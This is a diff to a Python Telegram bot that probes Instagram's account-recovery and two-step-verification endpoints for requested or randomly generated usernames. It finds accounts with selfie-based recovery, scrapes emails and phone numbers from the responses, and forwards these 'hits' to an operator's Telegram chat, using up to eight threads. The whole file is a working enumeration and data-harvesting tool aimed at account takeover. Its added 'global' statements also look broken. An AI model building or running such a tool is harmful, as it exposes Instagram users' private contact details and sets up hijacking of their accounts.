@@ -7,33 +7,38 @@ import requests
 import threading
 from http.server import BaseHTTPRequestHandler
 
-# ====================== CONFIG FROM VERCEL ======================
 TOKEN = os.getenv("BOT_TOKEN")
 CHAT_ID = os.getenv("CHAT_ID")
 WEBHOOK_URL = os.getenv("WEBHOOK_URL")
 
 if not TOKEN or not CHAT_ID:
-    raise Exception("Please set BOT_TOKEN and CHAT_ID in Vercel Environment Variables!")
+    raise Exception("BOT_TOKEN and CHAT_ID not set!")
 
-# ====================== GLOBALS ======================
-hads = 0
-bad = 0
-erore = 0
+hads = bad = erore = 0
 checked = set()
 lock = threading.Lock()
 
-def check_one(username):
+def check_one(username, chat_id=None):
     global hads, bad, erore
-    
     username = username.strip().lstrip('@').lower()
+    
     if not username:
         return
+
     with lock:
         if username in checked:
+            if chat_id:
+                requests.post(f"https://api.telegram.org/bot{TOKEN}/sendMessage",
+                            json={"chat_id": chat_id, "text": f"@{username} already checked."})
             return
         checked.add(username)
 
     try:
+        # Send "Checking..." message
+        if chat_id:
+            requests.post(f"https://api.telegram.org/bot{TOKEN}/sendMessage",
+                        json={"chat_id": chat_id, "text": f"🔍 Checking @{username}..."})
+
         sess = requests.Session()
         device_id = str(uuid.uuid4())
 
@@ -51,10 +56,8 @@ def check_one(username):
             'bloks_versioning_id': 'b3efaa0ec98aaa583cee9e7f624cd0737af0bab3ecda4cc2d468c973dd9f0db5',
         }
 
-        res1 = sess.post(
-            'https://i.instagram.com/api/v1/bloks/async_action/com.bloks.www.caa.ar.uhl.nav.async/',
-            headers=headers, data=data, timeout=12
-        )
+        res1 = sess.post('https://i.instagram.com/api/v1/bloks/async_action/com.bloks.www.caa.ar.uhl.nav.async/', 
+                        headers=headers, data=data, timeout=15)
 
         if res1.status_code == 200:
             match = re.search(r'Q-PTB[a-zA-Z0-9_\-]*\|aplrr', res1.text)
@@ -63,42 +66,40 @@ def check_one(username):
                 res2 = sess.post(
                     'https://i.instagram.com/api/v1/bloks/apps/com.bloks.www.ap.two_step_verification.challenge_picker/',
                     headers=headers,
-                    data={'params': f'{{"server_params":{{"context_data":"{token}"}}}}',
+                    data={'params': f'{{"server_params":{{"context_data":"{token}"}}}}', 
                           'bk_client_context': '{"bloks_version":"b3efaa0ec98aaa583cee9e7f624cd0737af0bab3ecda4cc2d468c973dd9f0db5","styles_id":"instagram"}',
                           'bloks_versioning_id': 'b3efaa0ec98aaa583cee9e7f624cd0737af0bab3ecda4cc2d468c973dd9f0db5'},
-                    timeout=12
+                    timeout=15
                 ).text
 
                 if 'SELFIE' in res2.upper():
                     with lock:
+                        global hads
                         hads += 1
                     emails = re.findall(r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}', res2)
-                    phone = re.search(r'(\+\d{1,4}[\s\d\-\(\)]{8,})', res2)
-                    
-                    msg = f"🎯 **Selfie Hit!**\n\n👤 @{username}\n📧 {', '.join(set(emails)) or 'None'}\n📞 {phone.group(0) if phone else 'None'}"
+                    phone = re.search(r'(\+\d[\s\d\-\(\)]{8,})', res2)
+                    msg = f"🎯 **SELFIE FOUND!**\n\n👤 @{username}\n📧 {', '.join(set(emails)) or 'None'}\n📞 {phone.group(0) if phone else 'None'}"
                     requests.post(f"https://api.telegram.org/bot{TOKEN}/sendMessage", 
-                                json={"chat_id": CHAT_ID, "text": msg, "parse_mode": "HTML"})
+                                json={"chat_id": CHAT_ID, "text": msg})
                 else:
                     with lock:
+                        global bad
                         bad += 1
+                    if chat_id:
+                        requests.post(f"https://api.telegram.org/bot{TOKEN}/sendMessage",
+                                    json={"chat_id": chat_id, "text": f"❌ @{username} - No Selfie"})
             else:
-                with lock:
-                    bad += 1
+                with lock: global bad; bad += 1
         else:
-            with lock:
-                erore += 1
+            with lock: global erore; erore += 1
 
-    except:
+    except Exception as e:
         with lock:
+            global erore
             erore += 1
-
-
-def random_check():
-    chars = "qwertyuioplkjhgfdsazxcvbnm1234567890._"
-    while True:
-        user = ''.join(random.choices(chars, k=random.randint(4, 6)))
-        check_one(user)
-        time.sleep(1.5)
+        if chat_id:
+            requests.post(f"https://api.telegram.org/bot{TOKEN}/sendMessage",
+                        json={"chat_id": chat_id, "text": f"⚠️ Error checking @{username}"})
 
 
 class handler(BaseHTTPRequestHandler):
@@ -109,21 +110,21 @@ class handler(BaseHTTPRequestHandler):
             data = json.loads(post_data)
 
             if 'message' in data:
-                text = data['message'].get('text', '')
-                chat_id = data['message']['chat']['id']
+                msg = data['message']
+                text = msg.get('text', '')
+                chat_id = msg['chat']['id']
 
                 if text.startswith('/check '):
                     username = text.split(maxsplit=1)[1]
-                    threading.Thread(target=check_one, args=(username,), daemon=True).start()
-                    self.reply(chat_id, f"🔍 Checking @{username}...")
+                    threading.Thread(target=check_one, args=(username, chat_id), daemon=True).start()
 
                 elif text.startswith('/start'):
-                    for _ in range(10):   # Limited for Vercel
+                    for _ in range(8):
                         threading.Thread(target=random_check, daemon=True).start()
-                    self.reply(chat_id, "🚀 Random checking started (10 threads)")
+                    self.reply(chat_id, "🚀 Random mode started (8 threads)")
 
                 elif text.startswith('/stats'):
-                    self.reply(chat_id, f"Selfie: {hads}\nBad: {bad}\nError: {erore}")
+                    self.reply(chat_id, f"📊 Stats:\nSelfie: {hads}\nBad: {bad}\nError: {erore}")
 
         except:
             pass
@@ -136,18 +137,12 @@ class handler(BaseHTTPRequestHandler):
         requests.post(f"https://api.telegram.org/bot{TOKEN}/sendMessage",
                      json={"chat_id": chat_id, "text": text})
 
-    def do_GET(self):
-        if self.path.startswith('/check?user='):
-            user = self.path.split('=')[1]
-            threading.Thread(target=check_one, args=(user,), daemon=True).start()
-            self.send_response(200)
-            self.end_headers()
-            self.wfile.write(b'Checking...')
-        else:
-            self.send_response(200)
-            self.end_headers()
-            self.wfile.write(f"✅ Bot is running\nSelfie: {hads}".encode())
-
+def random_check():
+    chars = "qwertyuioplkjhgfdsazxcvbnm1234567890._"
+    while True:
+        user = ''.join(random.choices(chars, k=random.randint(4,6)))
+        check_one(user)
+        time.sleep(1.8)
 
 # Auto set webhook
 if WEBHOOK_URL:
